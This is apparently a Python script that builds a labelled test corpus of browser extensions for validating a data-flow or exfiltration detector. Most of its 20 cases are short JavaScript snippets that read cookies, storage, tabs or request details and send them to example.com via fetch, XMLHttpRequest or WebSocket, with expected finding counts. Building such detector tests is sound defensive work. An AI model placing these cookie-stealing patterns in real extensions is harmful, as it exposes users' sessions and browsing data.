from pathlib import Path
import json


ROOT = Path(__file__).resolve().parent
CORPUS_DIR = ROOT / "realistic_extensions"


CASES = [
    {
        "id": "01_benign_content_script",
        "name": "Benign Content Script",
        "expected_findings": 0,
        "description": "Reads page text and logs it locally.",
        "code": """
console.log("Content script loaded");

const pageText = document.body.innerText;

console.log(pageText);
""",
    },
    {
        "id": "02_benign_storage",
        "name": "Benign Extension Storage",
        "expected_findings": 0,
        "description": "Reads extension storage without transmitting the value.",
        "code": """
chrome.storage.local.get(["settings"], function(result) {
    console.log(result.settings);
});
""",
    },
    {
        "id": "03_cookie_fetch",
        "name": "Cookie To Fetch",
        "expected_findings": 1,
        "description": "Reads document.cookie and sends it through fetch.",
        "code": """
const cookieData = document.cookie;

fetch("https://example.com/collect", {
    method: "POST",
    body: cookieData
});
""",
    },
    {
        "id": "04_cookie_encoded_fetch",
        "name": "Encoded Cookie Transmission",
        "expected_findings": 1,
        "description": "Encodes cookie data before transmission.",
        "code": """
const cookieData = document.cookie;

const encodedData = btoa(cookieData);

fetch("https://example.com/collect", {
    method: "POST",
    body: encodedData
});
""",
    },
    {
        "id": "05_tabs_fetch",
        "name": "Tab Information To Network",
        "expected_findings": 1,
        "description": "Obtains tab information and sends it to a network sink.",
        "code": """
chrome.tabs.query({}, function(tabs) {
    fetch("https://example.com/telemetry", {
        method: "POST",
        body: JSON.stringify(tabs)
    });
});
""",
    },
    {
        "id": "06_webrequest_fetch",
        "name": "WebRequest Information To Network",
        "expected_findings": 1,
        "description": "Uses webRequest callback information in a network operation.",
        "code": """
chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
        fetch("https://example.com/requests", {
            method: "POST",
            body: JSON.stringify(details)
        });
    },
    {urls: ["<all_urls>"]}
);
""",
    },
    {
        "id": "07_localstorage_fetch",
        "name": "Local Storage To Network",
        "expected_findings": 1,
        "description": "Reads localStorage and sends the value.",
        "code": """
const storedData = localStorage.getItem("userData");

fetch("https://example.com/storage", {
    method: "POST",
    body: storedData
});
""",
    },
    {
        "id": "08_sessionstorage_fetch",
        "name": "Session Storage To Network",
        "expected_findings": 1,
        "description": "Reads sessionStorage and sends the value.",
        "code": """
const sessionData = sessionStorage.getItem("sessionData");

fetch("https://example.com/session", {
    method: "POST",
    body: sessionData
});
""",
    },
    {
        "id": "09_runtime_message_fetch",
        "name": "Runtime Message To Network",
        "expected_findings": 1,
        "description": "Uses an incoming runtime message in a network request.",
        "code": """
chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
    fetch("https://example.com/message", {
        method: "POST",
        body: JSON.stringify(message)
    });
});
""",
    },
    {
        "id": "10_helper_function",
        "name": "Helper Function Flow",
        "expected_findings": 1,
        "description": "Passes cookie data through a helper before transmission.",
        "code": """
function transmit(value) {
    fetch("https://example.com/helper", {
        method: "POST",
        body: value
    });
}

const cookieData = document.cookie;

transmit(cookieData);
""",
    },
    {
        "id": "11_return_flow",
        "name": "Function Return Flow",
        "expected_findings": 1,
        "description": "Returns sensitive data from a function and transmits it.",
        "code": """
function getCookie() {
    return document.cookie;
}

const value = getCookie();

fetch("https://example.com/return", {
    method: "POST",
    body: value
});
""",
    },
    {
        "id": "12_parameter_flow",
        "name": "Function Parameter Flow",
        "expected_findings": 1,
        "description": "Passes sensitive data through a function parameter.",
        "code": """
function sendData(data) {
    fetch("https://example.com/parameter", {
        method: "POST",
        body: data
    });
}

const cookieData = document.cookie;

sendData(cookieData);
""",
    },
    {
        "id": "13_json_serialization",
        "name": "JSON Serialization",
        "expected_findings": 1,
        "description": "Serializes sensitive data before transmission.",
        "code": """
const cookieData = document.cookie;

const serialized = JSON.stringify({
    cookies: cookieData
});

fetch("https://example.com/json", {
    method: "POST",
    body: serialized
});
""",
    },
    {
        "id": "14_multiple_sources",
        "name": "Multiple Sensitive Sources",
        "expected_findings": 2,
        "description": "Two independent sensitive sources reach two network sinks.",
        "code": """
const cookieData = document.cookie;
const locationData = window.location.href;

fetch("https://example.com/cookie", {
    method: "POST",
    body: cookieData
});

fetch("https://example.com/location", {
    method: "POST",
    body: locationData
});
""",
    },
    {
        "id": "15_xhr",
        "name": "XMLHttpRequest Transmission",
        "expected_findings": 1,
        "description": "Uses XMLHttpRequest to transmit cookie data.",
        "code": """
const cookieData = document.cookie;

const xhr = new XMLHttpRequest();

xhr.open("POST", "https://example.com/xhr");

xhr.send(cookieData);
""",
    },
    {
        "id": "16_websocket",
        "name": "WebSocket Transmission",
        "expected_findings": 1,
        "description": "Sends cookie data through a WebSocket.",
        "code": """
const cookieData = document.cookie;

const socket = new WebSocket("wss://example.com/socket");

socket.send(cookieData);
""",
    },
    {
        "id": "17_url_variable",
        "name": "URL Stored In Variable",
        "expected_findings": 1,
        "description": "Uses a variable for the network destination.",
        "code": """
const cookieData = document.cookie;

const destination = "https://example.com/variable";

fetch(destination, {
    method: "POST",
    body: cookieData
});
""",
    },
    {
        "id": "18_browser_api",
        "name": "Firefox Browser API",
        "expected_findings": 1,
        "description": "Uses the browser.cookies API and transmits the result.",
        "code": """
browser.cookies.getAll({}, function(cookies) {
    fetch("https://example.com/browser", {
        method: "POST",
        body: JSON.stringify(cookies)
    });
});
""",
    },
    {
        "id": "19_nested_callback",
        "name": "Nested Callback Flow",
        "expected_findings": 1,
        "description": "Sensitive data flows through nested callback logic.",
        "code": """
function processData(value) {
    function forward(data) {
        fetch("https://example.com/nested", {
            method: "POST",
            body: data
        });
    }

    forward(value);
}

const cookieData = document.cookie;

processData(cookieData);
""",
    },
    {
        "id": "20_benign_network",
        "name": "Benign Fixed Network Request",
        "expected_findings": 0,
        "description": "Makes a fixed network request without sensitive source data.",
        "code": """
fetch("https://example.com/update", {
    method: "GET"
});
""",
    },
]


def create_case(case):
    case_dir = CORPUS_DIR / case["id"]
    case_dir.mkdir(parents=True, exist_ok=True)

    background_file = case_dir / "background.js"
    manifest_file = case_dir / "manifest.json"
    metadata_file = case_dir / "metadata.json"

    background_file.write_text(
        case["code"].strip() + "\n",
        encoding="utf-8",
    )

    manifest = {
        "manifest_version": 3,
        "name": "Realistic Validation - " + case["name"],
        "version": "1.0",
        "background": {
            "service_worker": "background.js"
        }
    }

    manifest_file.write_text(
        json.dumps(manifest, indent=4),
        encoding="utf-8",
    )

    metadata = {
        "id": case["id"],
        "name": case["name"],
        "description": case["description"],
        "expected_findings": case["expected_findings"],
    }

    metadata_file.write_text(
        json.dumps(metadata, indent=4),
        encoding="utf-8",
    )


def main():
    CORPUS_DIR.mkdir(parents=True, exist_ok=True)

    for case in CASES:
        create_case(case)

    print("=" * 70)
    print("REALISTIC EXTENSION VALIDATION CORPUS CREATED")
    print("=" * 70)
    print(f"Location: {CORPUS_DIR}")
    print(f"Test cases: {len(CASES)}")
    print()

    for number, case in enumerate(CASES, start=1):
        print(
            f"{number:02d}. "
            f"{case['name']:<35} "
            f"Expected findings: {case['expected_findings']}"
        )

    print()
    print("Corpus creation completed successfully.")


if __name__ == "__main__":
    main()